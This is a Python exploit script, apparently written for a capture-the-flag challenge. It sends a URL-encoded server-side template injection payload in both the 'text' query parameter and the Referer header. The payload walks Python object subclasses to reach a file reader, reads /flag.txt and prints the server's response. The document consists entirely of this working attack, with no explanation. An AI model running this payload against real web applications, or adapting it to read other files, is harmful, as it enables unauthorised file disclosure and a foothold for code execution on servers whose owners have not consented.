#!/usr/bin/python3
import sys
import requests

def send_get_request(target_url):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': f'http://{target_url}/?text=%24%7B%7B%27abc%27.__class__.__base__.__subclasses__%28%29%5B92%5D.__subclasses__%28%29%5B0%5D.__subclasses__%28%29%5B0%5D%28%27%2Fflag.txt%27%29.read%28%29%7D%7D',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }

    url = f'http://{target_url}/?text=%24%7B%7B%27abc%27.__class__.__base__.__subclasses__%28%29%5B92%5D.__subclasses__%28%29%5B0%5D.__subclasses__%28%29%5B0%5D%28%27%2Fflag.txt%27%29.read%28%29%7D%7D'

    try:
        response = requests.get(url, headers=headers)
        print(response.text)
    except requests.RequestException as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <target_url>")
        sys.exit(1)

    target_url = sys.argv[1]
    send_get_request(target_url)

